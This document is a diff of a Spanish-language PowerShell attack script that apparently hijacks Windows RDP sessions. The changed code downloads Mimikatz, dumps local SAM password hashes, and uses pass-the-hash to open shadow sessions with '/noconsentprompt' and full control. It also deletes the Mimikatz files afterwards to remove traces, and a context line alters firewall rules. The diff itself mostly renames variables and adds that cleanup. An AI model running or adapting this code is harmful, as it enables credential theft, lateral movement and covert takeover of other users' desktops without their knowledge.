@@ -152,17 +152,18 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         Clear-Host; Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - Consola semi-interactiva" ; Write-Host ""
         $module = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
         if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - Recuperar hashes locales" ; Write-Host ""
-        $module2 = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
-        if($module2 -like '1') { Write-Host "Módulo cargado con éxito!" -ForegroundColor Green ; sleep -milliseconds 2000
+        $mimikatz = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
+        if($mimikatz -like '1') { Write-Host "Módulo cargado con éxito!" -ForegroundColor Green ; sleep -milliseconds 2000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "" ; Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
-        Write-Host "" ; powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit ; Write-Host "" ; pause }}
+        Write-Host "" ; powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit 
+        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }}
         if($module -like '2') { $console ="true" ; Write-Host "Módulo cargado con éxito!" -ForegroundColor Green }
-	if($module -in '1','2') { $null }
+        if($module -in '1','2') { $null }
         else { Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta }
         sleep -milliseconds 2000 ; Clear-Host }
 	
@@ -249,16 +250,16 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         query session }  
         Write-Host ""
         $shadow = Read-Host -Prompt 'A qué sesión quieres conectarte?' 
-        if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
+        if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
     
         if($control -eq 'true') { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /control` /noconsentprompt` /f"
         $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-        if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
         else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
     
         else { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f"
         $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-        if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
         else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
     else { Write-Host ""
@@ -287,16 +288,16 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2000 
-    if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
+    if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
     
     if($control -eq 'true') { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /control` /noconsentprompt` /f"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-    if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+    if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
     
     else { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
-    if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+    if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
 Write-Host ""
